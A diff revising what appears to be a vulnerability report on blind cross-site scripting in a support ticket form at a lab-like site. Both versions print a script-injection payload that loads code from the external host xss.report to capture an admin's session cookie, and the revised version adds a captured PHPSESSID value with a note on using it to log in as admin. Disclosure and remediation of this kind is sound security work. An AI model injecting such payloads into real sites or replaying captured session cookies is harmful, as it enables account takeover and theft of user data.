@@ -1,6 +1,6 @@
 ---
 ## Title
-Blind Cross-Site Scripting (XSS) via Support Ticket Form
+Blind Cross-Site Scripting (XSS) in Support Ticket Form executes in Admin Panel
 
 ---
 ## Vulnerability Type
@@ -8,31 +8,32 @@ Blind XSS
 
 ---
 ## Summary
-The Support Ticket form has three input fields which are Name, Subject and Your Message. None of them sanitize user input before storing it in the database. The admin panel renders ticket name and subject via innerHTML without any sanitization which means any payload entered in those fields executes directly in the admin's browser the moment they open the support panel. The attacker gets no alert on their end at all. The only way to know it fired is by checking the XSS reporting tool which captured the admin's session cookie and browser details the moment the payload executed.
+I identified a blind XSS in the Support Ticket form. The Name, Subject and  Message feilds all accept and store raw HTML without any sanitization. The payload does not execute on the user side- it fires silently in the admin panel wehn an admin opens the ticket to review it. This was confirmed via XSS reporting tool which captured the admin's session cookie, URL, and full browser details the moment the payload executed.
 
 ---
 ## Vulnerable Endpoint
 ```
 https://kzlabs.com/64.php
 ```
-**Vulnerable Parameter:** Name, Subject and Your Message fields inside the Support Ticket form
+**Injection points** Name, Subject and  Message fields in the Support Ticket creation form
 
 ---
 ## Steps to Reproduce
-1. Go to `https://kzlabs.com/64.php` and open the Support Ticket form.
-2. In the **Name**, **Subject** and **Your Message** fields enter the following blind XSS payload:
+1. Navigate to the support Ticket form on the application
+`https://kzlabs.com/64.php`
+2. In the **Name**, **Subject** and **Message** fields enter the following payload:
 ```
-'"><script src=https://xss.report/c/shaz10></script>
+'"><script src=https://xss.report/c/ali1></script>
 ```
-3. Complete the reCAPTCHA and submit the ticket.
-4. Wait for the admin to log in and open the Support Admin Panel.
-5. Once the admin opens the panel the payload fires immediately in their browser since ticket name and subject are rendered via innerHTML without sanitization.
-6. The XSS reporting tool at `xss.report` captures the execution along with the admin's session cookie, domain, URL and full browser details.
+3. Complete the CAPTCHA and click submit.
+4. The payload does not fire on the user side - this is expected for blind XSS
+5. Wait for the admin to log in and review it, the payload fires in the browser automatically 
+7. The XSS reporting tool at `xss.report` captures the execution including  admin's session cookie, URL and full browser details.
 
 ---
 ## Payload Used
 ```
-'"><script src=https://xss.report/c/shaz10></script>
+'"><script src=https://xss.report/c/ali1></script>
 ```
 
 ---
@@ -59,17 +60,15 @@ https://kzlabs.com/64.php
 
 ---
 ## Impact
-- Full admin session hijack since the XSS report captured the admin's PHPSESSID cookie which can be used to take over the admin account without needing any credentials
-- The attacker gets the exact URL the admin was on, their browser user agent and the full domain confirming this is a real admin context execution
+- The payload fires silently in the admin browser the moment admin open any support ticket - zero interaction needed beyond viewing the ticket
+- Full admin session cookie captured - PHPSESSID=zap_adm_6gpmkuo1o1h - attacker can paste this into their browser and be immediately logged in as admin with no password needed.
 - Since the admin has full access to all support tickets and user data a compromised admin account means full control over the entire platform
-- The payload fires for every admin who opens the support panel not just one
-- Complete account takeover of the highest privilege account on the platform with zero interaction required from the attacker after submitting the ticket
+- Complete account takeover
 
 ---
 ## Remediation
 1. Filter out HTML tags like `<script>`, `<img>`, `<svg>` from the Name, Subject and Message fields before saving anything to the database
 2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
-3. Replace `innerHTML` with `textContent` when rendering ticket name and subject in the admin panel since `textContent` treats everything as plain text and the browser will never parse it as code
-4. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
-5. Implement a strict **Content Security Policy (CSP)** header that blocks loading of external scripts as this would have directly prevented the `xss.report` script from loading even if the payload got stored
-6. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
+3. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
+4. Implement a strict **Content Security Policy (CSP)** header that blocks loading of external scripts as this would have directly prevented the `xss.report` script from loading even if the payload got stored
+5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
